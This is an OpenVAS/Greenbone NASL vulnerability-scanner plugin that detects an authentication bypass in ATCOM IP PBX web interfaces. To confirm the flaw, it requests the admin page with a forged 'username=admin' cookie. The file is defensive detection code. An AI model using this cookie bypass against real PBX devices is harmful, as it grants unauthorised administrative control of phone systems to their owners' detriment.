# Copyright (C) 2016 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106102");
  script_version("2021-07-28T08:40:06+0000");
  script_tag(name:"last_modification", value:"2021-07-28 08:40:06 +0000 (Wed, 28 Jul 2021)");
  script_tag(name:"creation_date", value:"2016-06-20 16:19:47 +0700 (Mon, 20 Jun 2016)");
  script_tag(name:"cvss_base", value:"9.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("ATCOM PBX Authentication Bypass Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_atcom_pbx_detect.nasl", "global_settings.nasl");
  script_mandatory_keys("atcom_pbx/detected");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"ATCOM PBX is prone to an authentication bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"A vulnerability in js/util.js allows a remote attacker by
  setting a cookie with the value username to bypass authentication checks.");

  script_tag(name:"impact", value:"A remote attacker may gain administrative access to the web UI.");

  script_tag(name:"affected", value:"ATCOM all versions on ATCOM IP01, IP08, IP4G and IP2G4A.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39962/");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

res = http_get_cache(port: port, item: "/");

if ("ATCOM All Rights Reserved" >< res && "ATCOM IP PBX Login" >< res) {
  cookie = "username=admin";

  url = "/admin/index.html";
  if (http_vuln_check(port: port, url: url, pattern: "Kernel Version", check_header: TRUE,
                      cookie: cookie, extra_check: "Apply Changes")) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }

  exit(99);
}

exit(0);